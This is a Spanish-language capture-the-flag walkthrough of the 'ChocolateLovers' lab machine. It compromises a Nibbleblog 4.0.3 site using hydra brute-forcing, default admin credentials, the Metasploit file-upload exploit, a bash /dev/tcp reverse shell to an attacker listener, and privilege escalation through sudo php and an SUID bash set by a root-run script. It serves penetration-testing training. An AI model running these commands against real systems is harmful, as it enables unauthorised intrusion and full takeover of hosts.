- Tags: #ChocolateLovers
---
[Maquina ChocolateLovers](https://mega.nz/file/FbcgFS4J#_hcnLHn7jiXA-xlNkeXMRd92bJSaubMDeLIXZ-cMBrs) -> Enlace de descarga al laboratorio

```bash
7z x chocolatelovers.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh chocolatelovers.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion ip del target
```

```bash
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectivida con el target
```

```bash
wichSystem.py 172.17.0.2 # Gracias al ttl determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos y Servicios:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-60000 # Realizamos deteccion de puertos mediante TCP
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos con Nmap
```

```bash
extractPorts allPorts # Parseamos al informacion mas relevante de escaneo
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y las versiones que corren detras de estos puertos
```

### Fase Enumeracion Web:
```bash
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) # Servicio web detectado: ( ubuntuFocal ) 
```

```bash
http://172.17.0.2 # Tenemos el inicio del servicio apache2, Mirando el codigo fuente vemos lo siguiente

<!-- /nibbleblog --> # En los comentario una posible ruta
```

```bash
http://172.17.0.2/nibbleblog/ # Tenemos un seccion como panel de administracion
http://172.17.0.2/nibbleblog/admin.php # Nos otorga una url para iniciar session
```

**Nota** -> Despues de intentar de todo tipo de inyecciones usaremos **hydra** para realizar un ataque **HTTP** por medio de **POST** al formulario.
Indicamos que no queremos ver esta respuesta ya que indica que las credenciales son invalidas: **( Incorrect username or password. )**
```bash
# Nos genera falsos positivos, Asi que descartamos este medio
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/nibbleblog/admin.php:user=^USER^&pass=^PASS^:Incorrect username or password" 
```

Despues de que nos bloquearan mediante una lista lengra regresamos al panel de inicio de sesion:
```bash
http://172.17.0.2/nibbleblog/admin.php
```

Probamos credenciales tipicas como:
```bash
root: root
administrator: administratro
admin: admin # Con esta credencial logramos acceder.
```

Revisando la version de este software en: **( settings )** contempla: **( [Nibbleblog 4.0.3 "Coffee"](http://nibbleblog.com) - Developed by Diego Najar )**

### Fase Explotacion:
```bash
searchsploit nibbleblog 4.0.3 # Buscamos un exploit para esa version

Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb # Tenemos este disponible.
```

```bash
msfconsole # Iniciamos metasploit
```

```bash
search Nibbleblog # Filtramos por el nombre
use exploit/multi/http/nibbleblog_file_upload # Especificamos que queremos usar este exploit
```

```bash
show options # Si revisamos tenemos que setear todos estos valores.

 Name       Current Setting  Required  Description
 ----       ---------------  --------  -----------
 PASSWORD                    yes       The password to authenticate with
 RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
 RPORT      80               yes       The target port (TCP)
 TARGETURI  /                yes       The base path to the web application
 USERNAME                    yes       The username to authenticate with
```

```bash
# Configuracion final
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD admin
PASSWORD => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
TARGETURI => /nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > run # Con este indicamos que 
```

Nos reporta este mensaje;
```bash
[*] Started reverse TCP handler on 192.168.100.24:4444 
[-] Exploit aborted due to failure: unknown: Unable to upload payload.
[*] Exploit completed, but no session was created. # Se completo pero no se pudo iniciar la session.
```

Al parecer esta intentando abusar de un plugin de php: **( my_image )**
```bash
vprint_status("#{peer} - Preparing payload...")
    payload_name = "#{Rex::Text.rand_text_alpha_lower(10)}.php"

    data = Rex::MIME::Message.new
    data.add_part('my_image', nil, nil, 'form-data; name="plugin"')
    data.add_part('My image', nil, nil, 'form-data; name="title"')
```

```bash
http://172.17.0.2/nibbleblog/admin.php?controller=plugins&action=list # En el apartado de plugin del panel buscaremos por ( my_image )
```

Una ves instalado, el plguin correctamente procedemos a corren de nuevo el exploit para ver si logramos que se ejeucte correctamente.
```bash
[*] Started reverse TCP handler on 192.168.100.24:4444 
[*] Sending stage (40004 bytes) to 172.17.0.2
[+] Deleted image.php
[*] Meterpreter session 2 opened (192.168.100.24:4444 -> 172.17.0.2:40524) at 2025-05-27 21:01:49 +0000
```

```bash
shell # Ejecutamos este comando para obtener una shell y poder enviarnos una reserShell a nuestro equipo de atacante:\
```

```bash
nc -nlvp 443

bash -c "exec bash -i &>/dev/tcp/$IP/$PORT <&1" # Logramos obtener una sesion en el puerto que estamos en escucha
```

### Fase Escalada Privilegios:
```bash
</html/nibbleblog/content/private/plugins/my_image$ whoami

www-data # Tenemos una session como este usuario
```

```bash
ls -la # Listamos los archivos
db.xml # Este es el que nos permite la intrusion
```

```bash
chocolate # Tenemos este usuario en el sistema.
```

```bash
sudo -l

User www-data may run the following commands on 002a1bba86fd:
    (chocolate) NOPASSWD: /usr/bin/php # Tenemos una via potencial de escalar a este usuario.
```

```bash
sudo -u chocolate /usr/bin/php -r "system('/bin/bash');" # Obtenemos una shell como ( chocolate )
```

```bash
ps -faux # Listando los procesos del sistema encontramos que se esta ejecutando un script de php que pertenece a este usaurio.
-rw-r--r-- 1 chocolate chocolate 59 May  7  2024 /opt/script.php # Lo sobreescribiremos para inyectar un comando que otorgue privilegios SUID a la bash.
```

```bash
echo '<?php system("chmod u+s /bin/bash"); ?>' > /opt/script.php # Inyectamos esta instruccion php
```

```bash
ls -l /bin/bash # Listando los permisos ahora vemos que tiene privielgios SUID
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

```bash
bash -p # Nos lanzamos una bash con privilegios
```

```bash
bash-5.0# whoami
root # Ahora tenemos control total sobre el sistema.
```